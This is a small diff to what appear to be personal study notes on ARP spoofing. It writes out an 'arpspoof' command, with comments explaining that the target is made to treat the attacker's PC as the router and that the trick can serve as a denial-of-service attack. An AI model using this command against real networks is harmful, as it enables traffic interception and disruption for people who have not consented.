@@ -2,7 +2,9 @@
 #To find ips with mac address
 arp -a 
 
-#We tell the target machine that we are the router/spoofing
+#We tell the target machine that we are the router/spoofing, 
+#changes the MAC of the router on Target to be the hackers PC
+
 #Can also be used as a DDOS attack
 arpspoof -i interface -t targetip routerip
 
